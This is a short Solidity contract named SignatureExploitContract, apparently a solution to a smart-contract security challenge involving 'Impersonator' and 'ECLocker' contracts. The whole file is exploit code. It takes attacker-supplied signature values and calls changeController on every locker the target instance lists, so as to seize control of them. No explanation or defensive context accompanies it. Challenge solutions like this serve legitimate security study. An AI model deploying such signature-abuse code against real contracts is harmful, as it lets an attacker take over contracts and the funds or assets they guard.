pragma solidity ^0.8.0;

contract SignatureExploitContract {
    Impersonator impersonator;

    constructor(address _instance) {
        impersonator = Impersonator(_instance);
    }

    function craftAndExploit(uint8 v, bytes32 r, bytes32 s, address newController) external {
        ECLocker[] memory lockers = impersonator.lockers();
        
        for (uint256 i = 0; i < lockers.length; i++) {
            lockers[i].changeController(v, r, s, newController);
        }
    }
}

interface Impersonator {
    function lockers() external view returns (ECLocker[] memory);
}

interface ECLocker {
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
}